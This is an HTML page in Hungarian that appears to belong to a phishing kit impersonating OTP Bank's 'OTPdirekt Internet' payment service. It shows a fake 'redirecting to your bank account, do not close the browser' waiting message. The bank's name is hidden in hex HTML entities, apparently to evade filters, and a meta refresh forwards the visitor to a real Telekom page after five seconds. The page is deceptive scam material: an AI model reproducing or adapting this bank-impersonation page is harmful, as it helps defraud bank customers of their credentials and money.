<html xmlns="http://www.w3.org/1999/xhtml" lang="hu" xml:lang="hu"><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-2">
 <title>  &#x4f;&#x54;&#x50;&#x64;&#x69;&#x72;&#x65;&#x6b;&#x74 Internet</title>
<meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
        <meta http-equiv="refresh" content="5;url=https://www.telekom.hu/lakossagi" />
<link rel="icon" type="image/x-icon" href="./img/favicon.gif">
<link rel="shortcut_icon" type="image/x-icon" href="./img/favicon.gif">
		<meta http-equiv="X-UA-Compatible" content="IE=Edge">
		<link rel="stylesheet" type="text/css" href="./2/default.css">
	    </head>
	
    <body class="browserChrome browserChrome5">
        <div class="header">
            <div class="headerContent">
				
                <span class="logo"></span>
				
                <span class="title bold">
                	
						Internetes fizetes
					
				</span>
            </div>
        </div>
		
        <div class="content">
	<img src="./img/4.png" style="
    margin-left: 210px;
    margin-bottom: 10px;
"><br>
<div class="waitMsg">
	<img src="./2/ajax-loader-32-grey.gif" alt=""> 
	<p>
		Most atiranyitjuk a bankszamlajara. Kerjuk varjon, amig az oldal megjelenik, ne zarja be a bongeszot, mert ebben az esetben a tranzakcio sikertelenne valhat.</p>

	
</div>

<div class="cardIcons ">
	<img src="./2/cardIcons.gif" alt="">
</div>
			
        </div>
		
		
        <div class="copyright">
			C copyright 2006-2017 &#x4f;&#x54;&#x50;&#x20;&#x42;&#x61;&#x6e;&#x6b Nyrt.
        </div>
		</body></html>